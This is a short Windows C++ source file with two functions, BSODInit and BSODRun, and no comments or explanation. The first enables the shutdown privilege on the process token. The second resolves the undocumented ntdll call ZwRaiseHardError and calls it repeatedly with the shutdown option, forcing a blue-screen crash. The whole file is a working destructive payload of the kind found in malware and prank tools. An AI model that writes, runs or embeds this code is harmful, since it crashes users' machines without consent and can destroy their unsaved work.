#include "header.h"

enum HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
};

typedef LONG(WINAPI *ZwRaiseHardError_t)(LONG, ULONG, ULONG, PULONG_PTR, HARDERROR_RESPONSE_OPTION, PULONG);

struct UNICODE_STRING {
    USHORT Length, MaximumLength;
    PWCH Buffer;
};

void BSODInit()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES NewPrivilege;
    LUID PrivilegeLUID;
    while (true)
    {
        Sleep(10);
        if (!OpenProcessToken(
            GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        {
            continue;
        }
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &PrivilegeLUID);
        NewPrivilege.PrivilegeCount = 1;
        NewPrivilege.Privileges[0].Luid = PrivilegeLUID;
        NewPrivilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(
            hToken, FALSE, &NewPrivilege, NULL, NULL, NULL))
        {
            continue;
        }
        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        {
            continue;
        }
        break;
    }
}

void BSODRun()
{
    HMODULE hDll = GetModuleHandle(TEXT("ntdll.dll"));
    ZwRaiseHardError_t ZwRaiseHardError = (ZwRaiseHardError_t)GetProcAddress(hDll, "ZwRaiseHardError");
    UNICODE_STRING str = { 0, 0, NULL };
    ULONG x, args[] = { 0, 0, (ULONG)&str };
    while (true)
    {
        ZwRaiseHardError(0xFFFFFFFF, 3, 4, args, OptionShutdownSystem, &x);
        Sleep(2000);
    }
}
